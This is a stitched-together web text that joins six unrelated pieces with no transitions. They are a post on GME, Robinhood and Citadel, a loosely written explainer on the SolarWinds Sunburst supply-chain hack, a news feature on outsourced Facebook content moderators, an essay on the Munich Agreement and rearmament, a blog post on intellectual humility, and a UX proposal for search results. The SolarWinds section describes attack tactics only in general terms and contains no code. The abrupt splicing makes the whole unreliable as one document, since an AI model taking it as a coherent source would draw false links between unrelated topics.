<p>I can't tell you if there is a wallstreet conspiracy to save the hedge funds that shorted $GME. I certainly can't say that it didn't happen. But at least get the facts right. It is possible that the establishment of Wall Street called up the Robinhood execs to stop buy orders to save face or to save the hedge funds still short on GME. I'm not saying it's not. But please for the love of god do not say "THE HEDGE FUND CITADEL PAYS FOR ROBINHOOD ORDER FLOW" like I saw earlier. That makes zero sense.</p>
<p>Additionally I'm sure Citadel #1 and Citadel #2 have friends in leadership. Maybe Citadel #1 called up Citadel #2 to pressure Robinhood. But I would note that no one actually knows if Citadel #1 has short positions on GME to begin with. And no, "my dad works at Citadel and he told me that Citadel shorted GME" on Twitter is not a source.</p>
<p>I think in these moments, Occam's razor and Hanlon's razor are good to keep in mind</p>
<blockquote>
<p>the simplest explanation is usually the right one</p>
</blockquote>
<blockquote>
<p>never attribute to malice that which is adequately explained by stupidity</p>
</blockquote>

<p>On December 13, 2020, Reuters broke the story that the Treasury Department has been compromised by sophisticated hackers, and afterwords numerous organize confirm the story. Washington Post attributed hack to cozy bear (Russian SVR). To understand Solarwinds hack, first need to understand what <a href="https://www.solarwinds.com/" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">Solarwinds</a> does.</p>

<h2><span id="What_Solarwinds_does"></span>What Solarwinds does?<span></span></h2>
<p>Solarwinds is a software company which has numerous software offering for systems managements. These software programs are primarily managed by IT professionals at large institutions.</p>
<h2><span id="What_Solarwinds_Oroin_NMS_does"></span>What Solarwinds Oroin NMS does?<span></span></h2>
<p>Orion<strong> NMS (Network Management Systems)</strong> is the most popular software of Solarwinds and has capabilities of managing and monitoring a wide variety of devices such as servers, desktop, laptop, network devices etc. </p>

<p>The Company has 300,000+ customers worldwide, including 425 of US Fortune 500 companies. </p>

<h2><span id="How_hacker_compromises_Solarwinds_systems_And_Why_Solarwinds_hack_spread_for_so_long_without_detection"></span>How hacker compromises Solarwinds systems? And Why Solarwinds hack spread for so long without detection?<span></span></h2>
<p>Since Solarwinds NMS has access to so many devices in an institution and so many institutions use Solarwinds NMS, it becomes a prime target of hackers.</p>
<p>NMS are run on two modes. First is monitoring and second is monitoring/managing. Many of the systems are configured to do both. So if NMS compromised, attacker can do what NMS can do. </p>
<p>According to SEC filling by Solarwinds, hackers infiltrated as early as March 2020, and It took almost 9 months to detect <a href="https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html" target="_blank" aria-label=" (opens in a new tab)" rel="noreferrer noopener">the first instance of hack</a>, so why it took so long to figure out even tough 425 out of Fortunes 500 companies were using it.</p>
<p>Hacker compromise build server of Solarwinds and added malware(named sunburst) to existing software during build process and signed with Solarwinds digital signature. As once software signed by official signature, many of the anti-malware and anti-virus software accept that software behavior as normal, As anti-malware and anti-virus companies don’t know Solarwinds signature has been compromised. This is still evolving situation and some argue only build process was compromise. (But anyhow digital signature became useless). </p>
<p>Sophistication does not stop here. Malware was written in away, so it will stay dormant for first 15 days or so anti-malware and anti-virus can’t associate changes in network pattern to change in Solarwinds software version.</p>
<p>Not just that, Hackers make sure that sunburst maleware’s outgoing traffic look very similar to typical Solarwinds traffic. It seems like the hackers’ goal was to stay in the infected systems as long as possible. </p>
<p>The story gets even crazy, before executing sunburst malware, hacker will make sure it is not private IP or Microsoft IP ranges as it seems like hackers were aware that Microsoft has capabilities to capture this kind of activity, so hackers make sure malware does not connect to Microsoft IP. Kudos to Microsoft. </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody" data-epic-field="content">
<p>Ibrahim Halawa's head is full of Facebook. Well known for spending more than four years of his life in an Egyptian prison, he is now a Facebook content moderator. But he does not work for Facebook, and he dare not speak its name. It is simply "the client".</p>
<p>Ibrahim is one of thousands of outsourced workers across the world who view and remove violent and graphic content for the social media giant.</p>
<p>"We are expected to take care of the people on the social platform. And we want to do that," Ibrahim told Prime Time. "We want to create a safe platform for my nephews to use, for your kids to use, for everyone to use."</p>
<p>But though content moderation is core to its business, Facebook outsources this work. Workers feel left to carry the burden of rapidly processed graphic content without proper care or support, and are bound to secrecy in their contracts.&nbsp;</p>
<p>Ibrahim has decided to speak out. Today, he will be one of the workers’ representatives who meets Tánaiste and Minister for Trade, Enterprise &amp; Employment, Leo Varadkar.</p>
<p>The workers, and a London-based digital justice group that advocates on their behalf, Foxglove, believe it will be the first time a government politician anywhere in the world has met moderators to discuss their grievances.</p>
<figure><img alt="" src="https://img.rasset.ie/001625ac-614.jpg?ratio=1.78">
<figcaption>Ibrahim spent four years of his life in an Egyptian prison. He is now a Facebook content moderator</figcaption>
</figure>
<p>Their cause has been well-publicised over the last two years. They claim that they are treated as second-class workers, and have a range of complaints: compared to Facebook’s own staff, the pay and perks are poor. They also have issues with workplace protections, particularly during the Covid-19 pandemic. But their chief concern is their mental health.&nbsp;</p>
<p>Both Covalen, one of the outsourcing firms, and Facebook dispute their claims.</p>
<p>"In my opinion, it’s very disturbing work," said Dr Ann Leader, a consultant psychiatrist at Dublin’s Bon Secours hospital who has examined over 30 content moderators experiencing mental health distress. "Images of beheadings, of child rape, murders, dismemberments and really images that you couldn’t imagine, or you would never have seen anywhere else."</p>
<p>The videos that moderators must review can include, among other harrowing sounds, the screams of people being tortured. As a result, moderators often experience flashbacks, nightmares, anxiety, symptoms and panic attacks, Dr Leader said.</p>
<p>"They feel changed. They sometimes feel that their core values have shifted," she told Prime Time.</p>
<p>Ibrahim was detained in Egypt for four years without trial after he was arrested in August 2013, aged just 17, in connection with protests supporting the ousted Egyptian president, Mohamed Morsi.</p>
<p>Released in October 2017, after being acquitted at trial, he was welcomed home to Ireland. But then, he said, he went through his own experience of online abuse – targeted harassment, bullying, Islamophobia, and racism.&nbsp;</p>
<p>A friend suggested he take a job online. It was for CPL&nbsp;– now rebranded as Covalen&nbsp;– who was seeking content moderators for a large big tech client.</p>
<p>Covalen’s client was Facebook. But strict confidentiality clauses and secrecy rules curtail the moderators’ freedom to talk about what they do or, they say, even name who the client is.&nbsp;</p>
<p>Facebook compares the secrecy to standard non-disclosure agreements, or NDAs, in businesses where employees are working on sensitive content and user information.</p>
<figure><img alt="" src="https://img.rasset.ie/001625ad-614.jpg?ratio=1.78">
<figcaption>Facebook said that outsourcing this work gave it flexibility to meet global challenges.</figcaption>
</figure>
<p>All content moderators are required to sign confidentiality clauses with its outsourcing partners, partly to protect user information, and partly for the moderators’ own safety, Facebook told Prime Time in a statement.</p>
<p>"We want to ensure that they aren’t put in a position of being targeted based on that work, or the perceived work that they do", the company said.&nbsp;</p>
<p>But it also said that content moderators should "feel absolutely comfortable discussing the general challenges of their jobs with family and loved ones, so long as they’re not discussing specific details of the tools they use or personal identifiable information from the content."</p>
<p>Dr Leader said that moderators she has assessed who have worked for either Covalen or another provider, Accenture, have told her that they are Facebook’s "dirty little secret".&nbsp;</p>
<p>Moderators often work in separate locations to other Facebook employees. Partly because of the working conditions, and partly because of mental health issues, there is also a huge turnover in staff, with many moderators only lasting a short time in the job.</p>
<p>Facebook’s reasoning for its outsourcing is clear: it’s about flexibility to meet global challenges.&nbsp;</p>
<p>"We work with a global network of partners, so we can quickly adjust the focus of our workforce as needed," it said.</p>
<p>"For example, it gives us the ability to make sure we have the right language expertise and can quickly hire in different time zones as new needs arise or when a situation around the world warrants it."</p>
<p>But workers find contradiction in the parallel claims, by both Facebook and the outsourcing firms, that their work is consequential. Or, as Covalen puts it, that the "work carried out by content moderators is critical in keeping our online communities safe."&nbsp;</p>
<p>Moderators "see themselves very much as outsiders who are often working in completely different buildings, and do not have same perks. I think they are very dispensable people who have very low value and they quickly realise that themselves," said Dr Leader.</p>
<p>Covalen staunchly disputes the workers’ claims that they are not properly protected from the mental health hazards of their work.</p>
<p>"The health, safety and well-being of our employees is our top priority and we have many measures in place to ensure employee well-being, including unrestricted access to counselling services", it told Prime Time.&nbsp;</p>
<p>"Our Wellness Coaching team members are highly qualified professionals, many of them holding Masters or PhD level qualifications, in the areas of psychology, counselling and psychotherapy. This team provides 1:1 counselling support for all employees," it said.</p>
<p>"If required, follow-on referrals to occupational health are also supported by the Covalen team."</p>
<p>Workers and their lawyers are not convinced. Cori Crider, from Foxglove, said that the wellness coaching that workers are typically offered is limited and weak.&nbsp;</p>
<p>The workers believe they are being offered standard corporate wellness aids, when what they really need is something far more focused on what they have to do every day: rapidly process grueling and sometimes unthinkable content.</p>
<p>Ibrahim Halawa thinks his experience in prison steeled him for the difficult job of dealing with disturbing content. &nbsp;</p>
<p>"A lot of people are dreaming bad dreams. And for me, it took me a very very long time to actually properly sleep at night without getting any nightmares", he said.&nbsp;</p>
<figure><img alt="" src="https://img.rasset.ie/001625ae-614.jpg?ratio=1.78">
<figcaption>Due to intense political scrutiny, Facebook has faced increasing pressure about content on its platform</figcaption>
</figure>
<p>"It was very, very difficult. I was able to overcome it, because I had in the past such an ordeal, but some people won't be able to overcome it. Some people need people to be there for them."</p>
<p>In 2018, Facebook agreed $52m in compensation for over 10,000 content moderators in the US who suffered mental health impacts, including PTSD, or post-traumatic stress disorder.&nbsp;</p>
<p>And, last year, the Financial Times reported that another outsourcing provider, Accenture, had asked its content moderators to sign waivers that concluded with a stark warning: "I understand the content I will be reviewing could even lead to Post Traumatic Stress Disorder."</p>
<p>Due to intense political scrutiny, Facebook has faced increasing pressure about content on its platform. So too have its outsourced content moderators.</p>
<p>Yet the job of content moderator is one that Ibrahim wants to keep while he completes his studies in law school, once more supports are provided.</p>
<p>But Ibrahim said he is speaking out because doing this job should not come at the cost of his mental health.&nbsp;</p>
<p>"I didn't want to be reaching a numb stage, where I'm watching this stuff and I'm not feeling anything anymore," Ibrahim said. "I still want to be a human."</p>

		<p>A key defence of appeasement, and especially the 1938 Munich Agreement, is that it gave Britain and France time to rearm against the Nazi threat. It is actually an ex-post argument: Chamberlain himself sold his policies as a bid for peace, not time. He launched no rearmament effort until March 1939, when Hitler reneged on Munich. The idea has nevertheless achieved a surprising degree of acceptance, especially in Britain. It was worthwhile sacrificing Czechoslovakia in 1938 the better to be able to face Germany militarily in 1939/40, so it goes. Except it wasn’t.</p>
<p>In this post I set out why the Entente partners actually <em>lost&nbsp;</em>time at Munich in as few words as possible. The long argument can be found in <em>The Bell of Treason</em>or in my <em>International History Review&nbsp;</em>article on the subject. It is touched upon in the rest of the Munich literature, of course, though not with the full data.</p>
<p>The first reason Britain and France were worse off in 1939 than 1938 is that in 1939 they got a far weaker set of allies. In September 1938, they could count on Czechoslovakia and the Soviet Union. In September 1939, they only had Poland. Czechoslovakia had fully mobilised, possessed a well-equipped army, and could base its defence on a long fortification barrier. Poland was surprised in the middle of mobilization, its army was ill equipped, and – thanks to the Molotov-Ribbentrop pact of August 1939 – it was invaded from both sides. The longer explanation, again, is in my book.</p>

<p><em>Nuremberg Panzer factory (Ullstein Bild – Photo12 / Collection Bernard Crochet)</em></p>
<p>The key data is military. France, and with it Britain, lost time because the one to one-and-a-half years between 1938 and 1939/40 helped Germany far more than it helped them. This was partly because the Germans were able to seized the large Czechoslovak stockpiles and factories. A third of the tanks that pierced the French front in May 1940, causing the French collapse, were built in Czechoslovakia. Germany faced dire raw-material and production bottlenecks in 1938, which were relieved through time gained, the Czech annexation, and the Molotov-Ribbentrop pact. Meanwhile, German rearmament proper had only begun in 1935 when Hitler had reintroduced conscription. By 1938, Germany had thus been forming new army divisions for three years. By 1939 this was four years and by 1940 almost five: half as long again as by 1938.</p>
<p>I set out the relative army numbers, in simplified form, in the table below. France did not need to re-arm because it was already armed at or close to its full potential. Its accretion in military strength between 1938 and 1939 was limited. Germany’s accrued power was considerable. The difference became even more marked by 1940. This does not count the relative value of the Czechoslovak or Polish armies nor any Soviet contribution. Britain’s expeditionary force only increased from two to five divisions in the interval, so it can be ignored.</p>

<p>After the war started, France was able to put together another twenty divisions, while Germany assembled another forty. So France’s position changed from an advantage of fifteen divisions in 1938, to a disadvantage of twenty-four by 1939, which became forty-five in May 1940. This is a quantitative, not a qualitative overview, but two additional factors are worth mentioning. First, the 1938 German tanks were all Panzer I and II models, fitted with inferior armour and firepower. The mark I Panzer did not even possess a canon, just a machinegun. The tanks that pierced the French front in 1940 were mark III and IV – still at the prototype stage in 1938. Second, the German army was only able to push through Belgium, in 1940, by taking its border fortresses with glider and parachute units. In 1938, these elite units were still being assembled.</p>
<p>Germany lacked the firepower to defeat France in 1938. Indeed, it faced defeat at the hands of a stronger coalition, possibly in short order. It also follows, finally, that it was not in a position to launch an attack on Britain. This goes to the core of the theory that Chamberlain bought time by helping muster the country’s air defences. Actually in 1938 Britain was already producing Spitfires and Hurricanes, and output rhythms were not sped up until the spring of 1939 – and even then still less than to a wartime pace – so that the time gained was close to nil. But the key is that the <em>Luftwaffe</em>, even in 1940, could only launch an assault on Britain from bases in Belgium and northern France. It was not possible to do that from Germany. So until France fell, there could be no Battle of Britain. And if Germany lacked the land forces to defeat France in 1938 or 39…</p>
<p>The Battle of Britain was this incredibly romantic moment, immortalized by Churchill. Seen more coldly, though, it was only one of many turning points in WWII, the first among which were the falls of Poland, then France. The Battle of Britain was not even “the end of the beginning” (that was reserved to El Alamein). I want to close this post with Churchill’s own words, making exactly the point I make in the preceding paragraph.</p>
<p>“The German armies were not capable of defeating the French in 1938 or 1939. The vast tank production with which they broke the French front did not come into existence until 1940, and, in the face of French superiority in the West and an unconquered Poland in the East, they could certainly not have concentrated the whole of their air-power against England as they were able to do when France had been forced to surrender. This takes no account either of the attitude of Russia or of whatever resistance Czechoslovakia might have made. I have thought it right to set out the figures of relative air-power in the period concerned, but they do not in any way alter the conclusions which I have recorded. For all the above reasons, the year’s breathing-space said to be “gained” by Munich left Britain and France in a much worse position compared with Hitler’s Germany than they had been at the Munich crisis.”</p>

<p>Earlier, I had written about controversial court cases, such as the trials of George Zimmerman, Dominique Strauss Kahn &amp; the Duke Lacrosse Team. We discussed our <a rel="noopener" href="https://outlookzen.wordpress.com/2013/09/09/acknowledging-our-ignorance/" target="_blank">tendency to jump to conclusions</a> and assume what must have really happened, based on flimsy pieces of evidence and our own preconceived notions and biases. In truth, this isn’t isolated to sensational current events. This is endemic to the way we live our lives &amp; perceive the world every single day.</p>



<p>All too often, we see people who are so unwaveringly certain. Certain that their lifestyle &amp; way of doing things is best. Certain that their God is the one true God &amp; all others are heathens or infidels. Certain that their political beliefs are correct, and their opponents represent everything that is wrong with the country. Certain that they are right &amp; anyone who disagrees with them is wrong.</p>



<p>Personally, I find this certainty to be unbearably stifling. Even when I’m with like minded peers who subscribe to my political or lifestyle beliefs, I often find myself ill at ease with how certain they are of themselves, and how dismissive they are of anyone or anything that disagrees with their mental model of how the world works. Isn’t it possible to believe in something, while still holding reservations about the possibility of being wrong?</p>



<p>Hence why I found the <a rel="noopener" href="http://nyti.ms/1k1pB7c" target="_blank">following article so refreshing and insightful</a>:</p>



<blockquote><p><em>“One aim of the physical sciences has been to give an actual picture of the material world. One achievement of physics in the 20th century has been to show that such an aim is unattainable.” For Dr. Bronowski, there was no absolute knowledge and anyone who claims it — whether a scientist, a politician or a religious believer — opens the door to tragedy. All scientific information is imperfect and we have to treat it with humility. Such, for him, was the human condition.</em></p><p><em>This is the condition for what we can know, but it is also, crucially, a moral lesson. It is the lesson of 20th-century painting from Cubism onwards, but also that of quantum physics. All we can do is to push deeper and deeper into better approximations of an ever-evasive reality. The goal of complete understanding seems to recede as we approach it.</em></p><p><em>There is no God’s eye view, Dr. Bronowski insisted, and the people who claim that there is and that they possess it are not just wrong, they are morally pernicious. Errors are inextricably bound up with pursuit of human knowledge, which requires not just mathematical calculation but insight, interpretation and a personal act of judgment for which we are responsible.</em></p><p><em>… the genesis of Werner Heisenberg’s uncertainty principle in the hugely creative milieu that surrounded the physicist Max Born in the 1920s. Dr. Bronowski insisted that the principle of uncertainty was a misnomer, because it gives the impression that in science (and outside of it) we are always uncertain. But this is wrong. Knowledge is precise, but that precision is confined within a certain toleration of uncertainty.</em></p><p><em>… Dr. Bronowski thought that the uncertainty principle should therefore be called the principle of tolerance. Pursuing knowledge means accepting uncertainty. Heisenberg’s principle has the consequence that no physical events can ultimately be described with absolute certainty or with “zero tolerance,” as it were. The more we know, the less certain we are.</em></p><p><em>In the everyday world, we do not just accept a lack of ultimate exactitude with a melancholic shrug, but we constantly employ such inexactitude in our relations with other people. Our relations with others also require a principle of tolerance. We encounter other people across a gray area of negotiation and approximation. Such is the business of listening and the back and forth of conversation and social interaction.</em></p><p><em>For Dr. Bronowski, the moral consequence of knowledge is that we must never judge others on the basis of some absolute, God-like conception of certainty. All knowledge, all information that passes between human beings, can be exchanged only within what we might call “a play of tolerance,” whether in science, literature, politics or religion. As he eloquently put it, “Human knowledge is personal and responsible, an unending adventure at the edge of uncertainty.”</em></p><p><em>The relationship between humans and nature and humans and other humans can take place only within a certain play of tolerance. Insisting on certainty, by contrast, leads ineluctably to arrogance and dogma based on ignorance.</em></p><p><em>At this point, in the final minutes of the show, the scene suddenly shifts to Auschwitz, where many members of Bronowski’s family were murdered… The play of tolerance opposes the principle of monstrous certainty that is endemic to fascism and, sadly, not just fascism but all the various faces of fundamentalism. When we think we have certainty, when we aspire to the knowledge of the gods, then Auschwitz can happen and can repeat itself. Arguably, it has repeated itself in the genocidal certainties of past decades.</em></p><p><em>The pursuit of scientific knowledge is as personal an act as lifting a paintbrush or writing a poem, and they are both profoundly human. If the human condition is defined by limitedness, then this is a glorious fact because it is a moral limitedness rooted in a faith in the power of the imagination, our sense of responsibility and our acceptance of our fallibility. We always have to acknowledge that we might be mistaken. When we forget that, then we forget ourselves and the worst can happen.</em></p></blockquote>



<hr>



<p>To me, the central message from above is one of humility, and admitting the fallibility of our knowledge. The truth is, we live in an extraordinarily complicated world, and we ourselves are such humble, small and flawed creatures in comparison with the size, breadth and depth of our universe. Any certainty that we may ever hold, reflects more on our conceit, than on the world we live in. No human knowledge is ever certain, not even scientific knowledge. For centuries, Newtonian laws of physics were extremely well tested and formed the cornerstone of science… But they too were proven wrong by Einstein’s &nbsp;theory of relativity.</p>



<p>Of course we should still act and make the best decisions possible in the face of limited knowledge, but we should be aware of the lack of certainty. For a patient with heart disease, getting open-heart surgery is the right decision to take. Not because of absolute certainty in its effectiveness, but because it’s reasonably well proven and better than the alternative of doing nothing. Even with something as small as driving to work, we have to accept that there is no certainty of us reaching there safely. You could meet with an accident and die any day. This is very unlikely since we’ve made this same drive thousands of times safely, but we still have to acknowledge its possibility.</p>



<p>Living under the false delusion of absolute certainty will lead one to drive recklessly and not pay close attention to danger signs. The belief in absolute certainty closes off our minds, and stops us from learning anything new. Only by acknowledging the fallibility of our knowledge can we avoid making catastrophic mistakes, correct our mistaken prejudices, and continue bettering ourselves.</p>

        <h2>Searching the web</h2>
        <p>"Searching" is the most common action performed on the internet everyday. Google alone receives <a href="https://ardorseo.com/blog/how-many-google-searches-per-day-2019/#targetText=This%20translates%20to%20over%2040%2C000,listed%20by%20Internet%20Live%20Stats.">40,000 search queries every second (3.5 billion searches per day on average)</a>. That is a <i>lot</i> of queries. That also means there is a great deal of user interaction taking place between what is essentially a single text input and a list of outputted data. So, why has barely any UI/UX improvements been introduced over the years? I find it difficult to assume that the current "search engine design" has achieved <i>perfection</i> since there are so many obvious flaws.</p>
        <p>Let's take a stab at enhancing this extremely important user interface and see if we can evolve the search engine experience.</p>
        <h2>Default search engine results (DuckDuckGo)</h2>
        <p>For our baseline example we will use the <a href="https://duckduckgo.com/">DuckDuckGo</a> search engine. If you aren't currently using DDG as your default search engine, I recommend that you make the switch. Google has continually proven that they shouldn't be trusted with user data, nor do they have their customers' well being and privacy at the forefront of their priorities. I've <a href="https://bradleytaunt.com/stop-crawling-google/">talked about ditching Google in the past</a> if you're interested. &lt;/End rant&gt;</p>
        <p>This is what a default search result for the term "canada" returns:</p>
        <p><img src="https://uglyduck.ca/better-search-results/default-search-results.png" alt="Default Search Results">
        </p>
        <p>Overall the design is clean and focuses on exactly what the user cares about: the content. A quick, detailed pane is presented to the right of the top list results, giving the user an easy overview of the searched query. I have no real complaints about the visuals. The overall UX is a different story.</p>

        <h2>Respecting user limitations</h2>
        <p>Not everyone has unlimited data usage or fast internet. In fact, reliable internet is more of a first-world luxury that is often taken for granted. Many people (specifically those on restricted mobile plans or low-end, under-powered devices) can't afford to eat through their data caps when performing something as simple as an internet search. For some, these under-powered devices may be their only way to connect to the web. By forcing items like tracking scripts or injected advertisement media onto the users' devices, you're stealing away what little available data they have. You're also doing this while providing zero positive gain for the users themselves.</p>

        <h2>Introducing page size results</h2>
        <p>Why not give the user the ability to instantly know how much data each listing will consume <i>before</i> they commit to actually visiting that website? By introducing a simple toggle filter at the top of the search results (I would advocate to have this <i>active</i> by default) you give the user a quick-and-easy way to see each listing's total page size. Take a look at the concept of this idea below:</p>
        <p><img src="https://uglyduck.ca/better-search-results/page-size-results.png" alt="Page Size Search Results">
        </p>
        <p>In the top right section of each listing the user can now see how "heavy" each webpage item is. By displaying the page weight, users have a better understanding of which sites will be faster and easier on their data caps - based on a very simple addition.</p>
        <p>An indirect consequence (but overall a great bonus) of this page weight element being standard, is companies would be forced to review their current websites/apps, as to avoid being flagged.</p>
        <p><img src="https://uglyduck.ca/better-search-results/search-item-details.png" alt="Search Item Details">
        </p>
        <h3>• Page Size Indicator</h3>
        <p>This element would show the final size of the entire webpage the listing is linked to. Default styling would display this as a minimal, grey text item. Webpages with a total webpage size of <a href="https://www.machmetrics.com/speed-blog/website-size-the-average-web-page-size-is-more-than-2mb-twice-the-size-of-the-average-page-just-3-years-ago/">1MB or greater</a> would be styled in a way to warn the user of a large download requirement. (Light red background to attract immediate attention)</p>

        <h2>Scanning results</h2>
        <p>Having the ability to know the weight of a given listing is great, but what about privacy? Including an option to tell the user which listings will track, send your data to 3rd-party services, or display obnoxious ads should be more important than your data consumption. This can also be implemented with a simple UI:</p>
        <p><img src="https://uglyduck.ca/better-search-results/scan-results.png" alt="Scan Search Results">
        </p>
        <p><img src="https://uglyduck.ca/better-search-results/search-item-scan.png" alt="Search Item Scanned">
        </p>
        <h3>• Ads Indicator</h3>
        <p>This tag element is added to listings that contain certain flagged advertisement scripts (Google adsense, carbon ads, buysellads, etc.). Advertisements don't necessarily mean a <i>bad</i> experience, so their styling is designed as more informational.</p>
        <h3>• 3rd-Party Scripts Indicator</h3>
        <p>The tracking tag element is designed in a way to indicate a warning to the user. These scripts tend to ignore user privacy, so they have more importance to the user's security. These would include (but not be limited to) Google Analytics, Kissmetrics, Mixpanel, Chartbeat, etc. This element might also be a good way to "upsell" the user on using script blocking extensions like Ghostery or uBlock.</p>

        <h2>Companies reliant on advertisements</h2>
        <p>Won't companies dependent on embedded advertisements and tracking scripts push-back against this design concept? Probably.</p>
        <p>But too bad. My message to companies who rely on beefy ads and follower their users wherever they go, as a means to make a profit: <strong>Adapt or die.</strong></p>
        <p>Ruining your users' experience for the sake of monetizing your business is bad for said business in the long run. Personally, I believe it's border-line unethical. Your users never consent to these 3rd-party tracking scripts or give permission for you to force-download megabytes of data.</p> 
        <p>Stop feeding your customers garbage and you won't have to worry about more detailed search results. You'll be one of the <strong>good guys</strong> 👍. Figure out a way to make money without screwing over your users. It's just lazy to say "there is no other way" before even trying something else.</p>
